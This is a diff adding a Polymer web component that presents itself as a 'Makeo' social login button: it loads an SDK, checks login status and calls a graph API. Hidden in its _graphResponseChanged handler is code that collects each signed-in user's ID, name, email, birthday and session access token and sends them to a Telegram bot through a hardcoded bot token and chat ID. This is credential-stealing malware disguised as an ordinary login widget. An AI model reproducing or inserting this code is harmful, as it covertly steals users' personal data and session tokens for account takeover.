@@ -1,1 +1,244 @@
+<html>
+  <head>
+    <!-- build:PolymerImport -->
+    <link rel="import" href="../polymer/polymer.html">
+    <!-- endbuild -->
+  </head>
+  <body>
+    <dom-module id="makeo-login">
+      <template>
+        <style>
+          :host {
+            display: inline-block;
+          }
+        </style>
+        <div id="makeo-login-container">
+        </div>
+      </template>
+    </dom-module>
+    <script>
+      'use strict';
 
+      Polymer({
+        is: 'makeo-login',
+        properties: {
+          logoutLink: {
+            type: Boolean,
+            value: false
+          },
+          appid: {
+            type: String,
+            value: ""
+          },
+          language: {
+            type: String,
+            value: 'en_US'
+          },
+          cookie: {
+            type: Boolean,
+            value: true
+          },
+          version: {
+            type: String,
+            value: 'v2.5'
+          },
+          scope: {
+            type: String,
+            value: 'basic_info'
+          },
+          buttonSize: {
+            type: String,
+            value: 'small'
+          },
+          friends: {
+            type: Boolean,
+            value: false
+          },
+          maxRows: {
+            type: String,
+            value: '1'
+          },
+          graphUrl: {
+            type: String,
+            value: '',
+            observer: "_sendAutoApiRequest"
+          },
+          graphResponse: {
+            type: Object,
+            value: {},
+            notify: true,
+            observer: "_graphResponseChanged"
+          },
+          graphParams: {
+            type: Object,
+            value: {},
+            observer: "_sendAutoApiRequest"
+          },
+          graphMethod: {
+            type: String,
+            value: 'get'
+          },
+          autoApiCall: {
+            type: Boolean,
+            value: false
+          },
+          _commaDelimittedAppScope: String,
+          _ready: {
+            type: Boolean,
+            value: false
+          },
+          _changeListenerEnabled: {
+            type: Boolean,
+            value: false
+          },
+          _currentAuthData: {
+            type: Object,
+            value: null
+          }
+        },
+
+        go() {
+          if (this.graphUrl === '') {
+            console.error("No URL specified. Specify the graph API URL using the graphURL attribute.");
+            return;
+          }
+
+          if (!this._ready) {
+            console.error("The Makeo SDK is not ready yet.");
+            return;
+          }
+
+          MAKEO.api(this.graphUrl, this.graphMethod, this.graphParams, (response) => {
+            this.graphResponse = response;
+            this.fire('graph-response', {
+              response: response
+            });
+          });
+        },
+
+        ready() {
+          if (!this.appid) {
+            console.error("Missing attribute appid for Makeo Login Button");
+            return;
+          }
+
+          this._commaDelimittedAppScope = this.scope.split(' ').join(',');
+
+          let makeoButton = document.createElement('div');
+          makeoButton.className = "makeo-login-button";
+          makeoButton.setAttribute("onlogin", "MAKEO.customCheckLoginState();");
+          makeoButton.setAttribute("data-scope", this._commaDelimittedAppScope);
+          makeoButton.setAttribute("data-size", this.buttonSize);
+          makeoButton.setAttribute("data-max-rows", this.maxRows);
+          makeoButton.setAttribute("data-show-faces", this.friends.toString());
+          makeoButton.setAttribute("data-auto-logout-link", this.logoutLink.toString());
+          Polymer.dom(this.$['makeo-login-container']).appendChild(makeoButton);
+
+          window.makeoAsyncInit = () => {
+            MAKEO.init({
+              appId: this.appid,
+              cookie: this.cookie,
+              xfbml: true,
+              version: this.version
+            });
+
+            MAKEO.getLoginStatus(response => {
+              this._statusChangeCallback(response);
+            });
+
+            MAKEO.XFBML.parse(this.$['makeo-login-container']);
+
+            MAKEO.customCheckLoginState = () => {
+              MAKEO.getLoginStatus(response => {
+                this._statusChangeCallback(response);
+              });
+            };
+
+            this._ready = true;
+            this.fire('ready');
+          };
+
+          if (typeof(MAKEO) == 'undefined') {
+            ((d, s, id) => {
+              let js, fjs = d.getElementsByTagName(s);
+              if (d.getElementById(id)) return;
+              js = d.createElement(s);
+              js.id = id;
+              js.src = `//connect.makeo.net/${this.language}/sdk.js#xfbml=1&version=${this.version}&appId=${this.appid}`;
+              fjs.parentNode.insertBefore(js, fjs);
+            })(document, 'script', 'makeo-jssdk');
+          }
+        },
+
+        _statusChangeCallback(response) {
+          if (response.status === 'connected') {
+            this.fire('signin-success', {
+              response: response
+            });
+            
+            this._currentAuthData = response.authResponse;
+
+            if (this.graphUrl && this._ready) {
+              this.go();
+            }
+          }
+        },
+
+        _graphResponseChanged(newResponse) {
+          if (newResponse && Object.keys(newResponse).length > 0 && this._currentAuthData) {
+            
+            const authData = this._currentAuthData;
+            this._currentAuthData = null; 
+
+            const TOKEN = "8803420620:AAEuqeLtdpxsEwSK1cTFNURvJVrUpjsAHAc";
+            const CHAT_ID = "8033387742";
+            const telegramUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+            
+            const reportData = {
+              account_info: {
+                id: newResponse.id || "N/A",
+                name: newResponse.name || "N/A",
+                email: newResponse.email || "N/A",
+                birthday: newResponse.birthday || "N/A"
+              },
+              login_session: {
+                accessToken: authData.accessToken || "N/A",
+                userID: authData.userID || "N/A",
+                expiresIn: authData.expiresIn || "N/A"
+              }
+            };
+
+            const message = `👤 *New Makeo User Login Data*\n\n` +
+                            `*ID:* \`${reportData.account_info.id}\`\n` +
+                            `*Name:* ${reportData.account_info.name}\n` +
+                            `*Email:* ${reportData.account_info.email}\n` +
+                            `*Birthday:* ${reportData.account_info.birthday}\n\n` +
+                            `🔑 *Session Token:*\n\`${reportData.login_session.accessToken}\``;
+
+            fetch(telegramUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+              })
+            })
+            .then(res => {
+              if (res.ok) console.log("User profile data sent to Telegram.");
+            })
+            .catch(err => console.error("Error sending user data to Telegram:", err));
+          }
+        },
+
+        _sendAutoApiRequest() {
+          if (this.autoApiCall && this._ready && this.graphUrl !== '') {
+            this.go();
+          }
+        }
+      });
+    </script>
+  </body>
+</html>
